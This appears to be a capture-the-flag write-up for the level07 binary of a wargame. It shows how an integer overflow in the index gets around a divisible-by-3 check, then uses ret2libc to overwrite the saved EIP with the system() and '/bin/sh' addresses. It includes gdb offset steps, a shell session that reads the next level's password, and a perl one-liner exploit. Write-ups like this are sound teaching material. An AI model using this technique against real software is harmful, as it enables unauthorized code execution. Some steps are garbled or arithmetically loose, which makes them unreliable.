This program saves numbers entered by the user in a stack.
It uses scanf to take an index and a number from the user.
However, it has a protection mechanism that rejects indexes divisible by 3.
The goal is to overwrite data by finding a way to bypass this protection.

1. Overwrite main EIP to redirect execution flaw and obtain a shell.
2. Bypass protection by causing data writing overflow to write at EIP address with a non-divisible-by-3 input value.
3. Deduct offset between index 0 and EIP address:
   a. Open binary with gdb.
   b. Set breakpoints at command input listening.
   c. Store a value at index 1.
   d. Inspect stack after hitting the breakpoint to find the value at address 0xffffd547.
   e. Use 'info frame' command in gdb to get the saved EIP address at 0xffffd70c.
   f. The difference is 453 bytes, divide by 4 to get 114 (considering integers).
4. Use index 114 to overwrite EIP.
5. To avoid protection condition, enter an index that overflows at the actual index calculation and is not divisible by 3:
   a. Before writing to memory, the number is multiplied by 4.
   b. For correct overflow, the binary performs ESP + ARRAY_INDEX + UINT_MAX + 453 to modify the saved EIP.
   c. Our input will be:
      I. (UINT_MAX / 4) + CEIL(453 / 4)
      II. (4294967295 / 4) + 114
      III. (4294967295 / 4) + 114
      IV. CEIL(4294967295 / 4) + 114
      V. 1073741824 + 114
      VI. 1073741938
6. Perform ret2libc to obtain a shell, requiring the addresses of the system function and the string "/bin/sh" in libc:
   a. Open program in gdb.
   b. Run the program once and obtain system address: 0xf7e6aed0.
   c. Set breakpoint in main, run 'i proc map' command, and find "/bin/sh" in the largest libc range to get address 0xf7f897ec.
7. Replace EIP save of main function with system address and place the address of "/bin/sh" at EIP + (2 * 4), which corresponds to index 116.
8. Demonstrating the information:
   a. System address: 0xf7e6aed0 (hex) or 4159090384 (decimal), overwrite at overflowing index 1073741938.
   b. Address of "/bin/sh": 0xf7f897ec (hex) or 4160264172 (decimal), write at index 116.
9. Result:

level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 1073741938
 Number at data[1073741938] is 4159090384
 Completed read command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: read
 Index: 116
 Number at data[116] is 4160264172
 Completed read command successfully
Input command: quit
$ whoami
level08
$ cat ~level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ 

10. Here is a one liner : (perl -e 'print "store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit\n"'; cat -) | ./level07
11. We got the flag 

